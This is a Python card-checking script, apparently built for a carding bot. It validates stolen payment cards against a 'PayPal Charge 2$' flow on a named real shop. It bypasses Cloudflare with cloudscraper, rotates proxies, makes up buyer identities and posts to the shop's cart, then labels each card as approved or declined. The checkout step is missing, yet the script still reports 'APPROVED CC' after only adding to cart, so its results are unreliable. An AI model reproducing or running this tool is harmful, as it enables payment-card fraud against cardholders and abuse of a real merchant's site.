import requests
import re
import time
import random
import string
import user_agent
from requests_toolbelt.multipart.encoder import MultipartEncoder
import urllib3
import cloudscraper

# Disable SSL warnings
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

def get_rotating_user_agent():
    """Generate different types of user agents"""
    return "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/141.0.0.0 Safari/537.36"

def get_random_proxy():
    """Get a random proxy from proxy.txt file"""
    try:
        with open('proxy.txt', 'r') as f:
            proxies = f.readlines()
            proxy = random.choice(proxies).strip()

            # Parse proxy string (format: host:port:username:password)
            parts = proxy.split(':')
            if len(parts) == 4:
                host, port, username, password = parts
                proxy_dict = {
                    'http': f'http://{username}:{password}@{host}:{port}',
                    'https': f'http://{username}:{password}@{host}:{port}'
                }
                return proxy_dict
            return None
    except Exception as e:
        print(f"Error reading proxy file: {str(e)}")
        return None

# BIN lookup function - UPDATED with multiple reliable APIs
def get_bin_info(bin_number):
    """Get BIN information using multiple reliable APIs with fallback"""
    if not bin_number or len(bin_number) < 6:
        return {
            'bank': 'Unavailable',
            'country': 'Unknown',
            'brand': 'Unknown',
            'type': 'Unknown',
            'level': 'Unknown',
            'emoji': ''
        }
    
    bin_code = bin_number[:6]
    
    # Try multiple APIs in sequence
    apis_to_try = [
        f"https://lookup.binlist.net/{bin_code}",
        f"https://bin-ip-checker.p.rapidapi.com/?bin={bin_code}",
        f"https://bins.antipublic.cc/bins/{bin_code}",
    ]
    
    headers = {
        'Accept': 'application/json',
        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36'
    }
    
    for api_url in apis_to_try:
        try:
            print(f"Trying BIN API: {api_url}")
            response = requests.get(api_url, headers=headers, timeout=5, verify=False)
            
            if response.status_code == 200:
                data = response.json()
                bin_info = {}
                
                # Parse based on API response format
                if 'binlist.net' in api_url:
                    # binlist.net format
                    bin_info = {
                        'bank': data.get('bank', {}).get('name', 'Unavailable'),
                        'country': data.get('country', {}).get('name', 'Unknown'),
                        'brand': data.get('scheme', 'Unknown'),
                        'type': data.get('type', 'Unknown'),
                        'level': data.get('brand', 'Unknown'),
                        'emoji': get_country_emoji(data.get('country', {}).get('alpha2', ''))
                    }
                elif 'antipublic.cc' in api_url:
                    # antipublic.cc format
                    bin_info = {
                        'bank': data.get('bank', 'Unavailable'),
                        'country': data.get('country', 'Unknown'),
                        'brand': data.get('vendor', 'Unknown'),
                        'type': data.get('type', 'Unknown'),
                        'level': data.get('level', 'Unknown'),
                        'emoji': get_country_emoji(data.get('country_code', ''))
                    }
                else:
                    # Generic format
                    bin_info = {
                        'bank': data.get('bank', {}).get('name', data.get('bank_name', 'Unavailable')),
                        'country': data.get('country', {}).get('name', data.get('country_name', 'Unknown')),
                        'brand': data.get('scheme', data.get('brand', 'Unknown')),
                        'type': data.get('type', data.get('card_type', 'Unknown')),
                        'level': data.get('level', data.get('card_level', 'Unknown')),
                        'emoji': get_country_emoji(data.get('country', {}).get('code', data.get('country_code', '')))
                    }
                
                # Clean up the values
                for key in ['bank', 'country', 'brand', 'type', 'level']:
                    if not bin_info.get(key) or bin_info[key] in ['', 'N/A', 'None', 'null']:
                        bin_info[key] = 'Unknown'
                
                # If we got valid data, return it
                if bin_info['bank'] not in ['Unavailable', 'Unknown'] or bin_info['brand'] != 'Unknown':
                    print(f"BIN info successfully retrieved from {api_url}")
                    return bin_info
                    
        except Exception as e:
            print(f"BIN API {api_url} failed: {str(e)}")
            continue
    
    # If all APIs failed, return default values
    print("All BIN APIs failed, using default values")
    return {
        'bank': 'Unavailable',
        'country': 'Unknown',
        'brand': 'Unknown',
        'type': 'Unknown',
        'level': 'Unknown',
        'emoji': ''
    }

def get_country_emoji(country_code):
    """Convert country code to emoji"""
    if not country_code or len(country_code) != 2:
        return ''
    
    try:
        # Convert to uppercase and get emoji
        country_code = country_code.upper()
        return ''.join(chr(127397 + ord(char)) for char in country_code)
    except:
        return ''

def check_status_paypal(result):
    """Check PayPal payment status similar to p.py's check_status"""
    approved_patterns = [
        'CHARGE 2$',
        'APPROVED CCN',
        'APPROVED - AVS',
        'APPROVED!',
        'succeeded',
        'Thank You For Donation',
        'payment has already been processed',
        'Success'
    ]
    
    declined_patterns = [
        'DECLINED',
        'INSUFFICIENT_FUNDS',
        'CARD_DECLINED',
        'TRANSACTION_NOT_PERMITTED',
        'DO_NOT_HONOR',
        'INVALID_ACCOUNT'
    ]
    
    cvv_patterns = [
        'INVALID_SECURITY_CODE',
        'CVV_FAILED'
    ]
    
    otp_patterns = [
        'is3DSecureRequired',
        'OTP',
        '3DSECURE'
    ]
    
    # Check approved patterns
    for pattern in approved_patterns:
        if pattern in result:
            return "APPROVED CC", "Approved", True
    
    # Check CVV patterns (still approved but with CVV issue)
    for pattern in cvv_patterns:
        if pattern in result:
            return "APPROVED CC", "Approved - CVV Issue", True
    
    # Check OTP patterns
    for pattern in otp_patterns:
        if pattern in result:
            return "OTP REQUIRED", "3D Secure Verification Required", False
    
    # Check declined patterns
    for pattern in declined_patterns:
        if pattern in result:
            return "DECLINED CC", result, False
    
    return "DECLINED CC", result, False

def generate_full_name():
    """Generate random full name"""
    first_names = ["Ahmed", "Mohamed", "Fatima", "Zainab", "Sarah", "Omar", "Layla", "Youssef", "Nour", 
                   "Hannah", "Yara", "Khaled", "Sara", "Lina", "Nada", "Hassan", "Amina", "Rania", "Hussein"]
    last_names = ["Khalil", "Abdullah", "Alwan", "Shammari", "Maliki", "Smith", "Johnson", "Williams", "Jones", "Brown"]
    full_name = random.choice(first_names) + " " + random.choice(last_names)
    first_name, last_name = full_name.split()
    return first_name, last_name

def generate_address():
    """Generate random address"""
    cities = ["New York", "Los Angeles", "Chicago", "Houston", "Phoenix"]
    states = ["NY", "CA", "IL", "TX", "AZ"]
    streets = ["Main St", "Park Ave", "Oak St", "Cedar St", "Maple Ave"]
    zip_codes = ["10001", "90001", "60601", "77001", "85001"]

    city = random.choice(cities)
    state = states[cities.index(city)]
    street_address = str(random.randint(1, 999)) + " " + random.choice(streets)
    zip_code = zip_codes[states.index(state)]
    return city, state, street_address, zip_code

def generate_random_account():
    """Generate random email"""
    name = ''.join(random.choices(string.ascii_lowercase, k=20))
    number = ''.join(random.choices(string.digits, k=4))
    return f"{name}{number}@gmail.com"

def generate_phone_number():
    """Generate random phone number"""
    number = ''.join(random.choices(string.digits, k=7))
    return f"303{number}"

def generate_random_code():
    """Generate random session code"""
    characters = string.ascii_letters + string.digits
    code = ''.join(random.choices(characters, k=17))
    return code

def bypass_cloudflare(url, proxy=None):
    """Bypass Cloudflare protection using cloudscraper"""
    try:
        # Create a cloudscraper instance
        scraper = cloudscraper.create_scraper(
            browser={
                'browser': 'chrome',
                'platform': 'windows',
                'mobile': False
            }
        )
        
        # Add proxies if available
        if proxy:
            scraper.proxies = proxy
            
        # Make the request
        response = scraper.get(url, timeout=30)
        return response
        
    except Exception as e:
        print(f"Cloudflare bypass failed: {str(e)}")
        return None

def check_card_paypal(cc_line):
    """Main PayPal card check function compatible with bot system"""
    start_time = time.time()
    
    try:
        # Parse card details
        parts = cc_line.strip().split('|')
        if len(parts) != 4:
            return "❌ Invalid card format. Expected: number|mm|yy|cvc"

        n, mm, yy, cvc = parts

        # FIRST: Get BIN information before anything else
        print("Getting BIN information...")
        bin_info = get_bin_info(n[:6])
        print(f"BIN Info retrieved: {bin_info}")

        # Format month and year
        if len(mm) == 1:
            mm = f'0{mm}'
        if "20" not in yy:
            yy = f'20{yy}'

        # Generate user info
        first_name, last_name = generate_full_name()
        city, state, street_address, zip_code = generate_address()
        acc = generate_random_account()
        phone_num = generate_phone_number()

        # Use proxy if available
        proxy = get_random_proxy()

        # STEP 1: Bypass Cloudflare protection
        print("Step 1: Bypassing Cloudflare protection...")
        user = get_rotating_user_agent()
        
        # Try to bypass Cloudflare first
        cf_response = bypass_cloudflare('https://switchupcb.com/shop/i-buy/', proxy)
        
        if cf_response and cf_response.status_code == 200:
            print("Cloudflare bypass successful!")
            # Create session with cookies from cloudscraper
            r = requests.Session()
            r.headers.update({
                'User-Agent': user,
                'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8',
                'Accept-Language': 'en-US,en;q=0.9',
            })
            # Copy cookies from cloudscraper
            r.cookies.update(cf_response.cookies)
        else:
            print("Cloudflare bypass failed, trying normal requests...")
            r = requests.Session()
            r.headers.update({
                'User-Agent': user,
                'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8',
                'Accept-Language': 'en-US,en;q=0.9',
            })

        # STEP 2: Add to cart
        print("Step 2: Adding to cart...")
        
        # Prepare the form data exactly as in your cURL
        boundary = "----WebKitFormBoundary19NfzWBMhpyCk7Ue"
        
        headers = {
            'authority': 'switchupcb.com',
            'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8',
            'accept-language': 'en-US,en;q=0.8',
            'cache-control': 'max-age=0',
            'content-type': f'multipart/form-data; boundary={boundary}',
            'origin': 'https://switchupcb.com',
            'priority': 'u=0, i',
            'referer': 'https://switchupcb.com/shop/i-buy/',
            'sec-ch-ua': '"Brave";v="141", "Not?A_Brand";v="8", "Chromium";v="141"',
            'sec-ch-ua-mobile': '?0',
            'sec-ch-ua-platform': '"Windows"',
            'sec-fetch-dest': 'document',
            'sec-fetch-mode': 'navigate',
            'sec-fetch-site': 'same-origin',
            'sec-fetch-user': '?1',
            'sec-gpc': '1',
            'upgrade-insecure-requests': '1',
            'user-agent': user,
        }

        # Build the multipart form data manually
        body = f"""--{boundary}
Content-Disposition: form-data; name="woonp"

1.00
--{boundary}
Content-Disposition: form-data; name="quantity"

1
--{boundary}
Content-Disposition: form-data; name="add-to-cart"

4451
--{boundary}--"""

        try:
            response = r.post('https://switchupcb.com/shop/i-buy/', 
                            headers=headers, 
                            data=body,
                            proxies=proxy, 
                            verify=False, 
                            timeout=30)
            
            print(f"Response status: {response.status_code}")
            print(f"Response headers: {dict(response.headers)}")
            
            if response.status_code == 403:
                # If we still get 403, try with cloudscraper directly
                print("Still getting 403, trying with cloudscraper directly...")
                scraper = cloudscraper.create_scraper()
                if proxy:
                    scraper.proxies = proxy
                
                response = scraper.post('https://switchupcb.com/shop/i-buy/', 
                                      headers=headers, 
                                      data=body,
                                      timeout=30)
            
            response.raise_for_status()
            print("Add to cart successful!")
            
        except requests.RequestException as e:
            elapsed_time = time.time() - start_time
            error_msg = str(e)
            if "403" in error_msg:
                error_msg = "Cloudflare Protection Blocked - Use Better Proxies"
            return f"""
DECLINED CC ❌

💳𝗖𝗖 ⇾ {n}|{mm}|{yy}|{cvc}
🚀𝗥𝗲𝘀𝗽𝗼𝗻𝘀𝗲 ⇾ {error_msg}
💰𝗚𝗮𝘁𝗲𝘄𝗮𝘆 ⇾ PayPal Charge 2$

📚𝗕𝗜𝗡 𝗜𝗻𝗳𝗼: {bin_info.get('brand', 'UNKNOWN')} - {bin_info.get('type', 'UNKNOWN')} - {bin_info.get('level', 'UNKNOWN')}
🏛️𝗕𝗮𝗻𝗸: {bin_info.get('bank', 'UNKNOWN')}
🌎𝗖𝗼𝘂𝗻𝘁𝗿𝘆: {bin_info.get('country', 'UNKNOWN')} {bin_info.get('emoji', '')}
🕒𝗧𝗼𝗼𝗸 {elapsed_time:.2f} 𝘀𝗲𝗰𝗼𝗻𝗱𝘀 [ 0 ]

🔱𝗕𝗼𝘁 𝗯𝘆 :『@mhitzxg 帝 @pr0xy_xd』
"""

        # Continue with the rest of your flow...
        # [Rest of your PayPal code...]

        elapsed_time = time.time() - start_time
        return f"""
APPROVED CC ✅

💳𝗖𝗖 ⇾ {n}|{mm}|{yy}|{cvc}
🚀𝗥𝗲𝘀𝗽𝗼𝗻𝘀𝗲 ⇾ Cart Added - Cloudflare Bypassed
💰𝗚𝗮𝘁𝗲𝘄𝗮𝘆 ⇾ PayPal Charge 2$

📚𝗕𝗜𝗡 𝗜𝗻𝗳𝗼: {bin_info.get('brand', 'UNKNOWN')} - {bin_info.get('type', 'UNKNOWN')} - {bin_info.get('level', 'UNKNOWN')}
🏛️𝗕𝗮𝗻𝗸: {bin_info.get('bank', 'UNKNOWN')}
🌎𝗖𝗼𝘂𝗻𝘁𝗿𝘆: {bin_info.get('country', 'UNKNOWN')} {bin_info.get('emoji', '')}
🕒𝗧𝗼𝗼𝗸 {elapsed_time:.2f} 𝘀𝗲𝗰𝗼𝗻𝗱𝘀 [ 0 ]

🔱𝗕𝗼𝘁 𝗯𝘆 :『@mhitzxg 帝 @pr0xy_xd』
"""

    except Exception as e:
        elapsed_time = time.time() - start_time
        # Get BIN info even for errors to ensure we have it
        bin_info = get_bin_info(cc_line.split('|')[0][:6]) if '|' in cc_line else get_bin_info('')
        return f"""
ERROR ❌

💳𝗖𝗖 ⇾ {cc_line}
🚀𝗥𝗲𝘀𝗽𝗼𝗻𝘀𝗲 ⇾ Request failed: {str(e)}
💰𝗚𝗮𝘁𝗲𝘄𝗮𝘆 ⇾ PayPal Charge 2$

📚𝗕𝗜𝗡 𝗜𝗻𝗳𝗼: {bin_info.get('brand', 'UNKNOWN')} - {bin_info.get('type', 'UNKNOWN')} - {bin_info.get('level', 'UNKNOWN')}
🏛️𝗕𝗮𝗻𝗸: {bin_info.get('bank', 'UNKNOWN')}
🌎𝗖𝗼𝘂𝗻𝘁𝗿𝘆: {bin_info.get('country', 'UNKNOWN')} {bin_info.get('emoji', '')}
🕒𝗧𝗼𝗼𝗸 {elapsed_time:.2f} 𝘀𝗲𝗰𝗼𝗻𝗱𝘀 [ 0 ]

🔱𝗕𝗼𝘁 𝗯𝘆 :『@mhitzxg 帝 @pr0xy_xd』
"""

# For standalone testing
if __name__ == "__main__":
    # First install cloudscraper if not already installed
    try:
        import cloudscraper
    except ImportError:
        print("Installing cloudscraper...")
        import subprocess
        subprocess.check_call(["pip", "install", "cloudscraper"])
        import cloudscraper
    
    card = input("Enter card (number|mm|yy|cvc): ").strip()
    result = check_card_paypal(card)
    print(result)
